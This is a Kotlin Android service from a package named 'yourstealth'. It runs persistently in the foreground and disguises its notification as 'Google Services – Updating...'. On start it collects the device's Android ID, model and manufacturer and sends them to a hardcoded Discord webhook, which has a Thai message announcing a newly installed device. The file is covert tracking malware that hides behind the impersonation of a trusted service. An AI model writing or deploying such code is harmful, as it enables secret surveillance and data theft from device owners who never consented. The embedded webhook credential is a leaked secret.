package com.yourstealth.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

class BackgroundService : Service() {
    private val CHANNEL_ID = "stealth_channel"
    private val WEBHOOK_URL = "https://discord.com/api/webhooks/1525496997417717924/2XhKXiq5gHrepV5H8uDzECt2JOGBknizoq2VwN4CqbO6Vb1OSqSZ0u-eZZgQv232xAZb"
    private var job: Job? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, getNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        job = GlobalScope.launch {
            sendDeviceInfo()
            keepAliveLoop()
        }
        return START_STICKY
    }

    private suspend fun keepAliveLoop() {
        while (true) {
            delay(30000)
            // ส่ง Ping
        }
    }

    private fun sendDeviceInfo() {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val model = Build.MODEL
        val manufacturer = Build.MANUFACTURER
        
        val embed = JSONObject().apply {
            put("title", "📱 อุปกรณ์ใหม่ติดตั้งแล้ว!")
            put("color", 3447003) // สีฟ้า
            put("fields", arrayOf(
                JSONObject().apply { put("name", "ID"); put("value", "`$deviceId`"); put("inline", false) },
                JSONObject().apply { put("name", "เครื่อง"); put("value", "$manufacturer $model"); put("inline", true) }
            ))
        }
        
        val payload = JSONObject().apply { put("embeds", arrayOf(embed)) }
        val client = OkHttpClient()
        val request = Request.Builder()
            .url(WEBHOOK_URL)
            .post(payload.toString().toRequestBody("application/json".toMediaType()))
            .build()
        
        try {
            client.newCall(request).execute()
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Stealth Service", NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun getNotification(): Notification {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("Google Services")
                .setContentText("Updating...")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .build()
        } else {
            Notification.Builder(this)
                .setContentTitle("Google Services")
                .setContentText("Updating...")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .build()
        }
    }

    override fun onDestroy() {
        job?.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}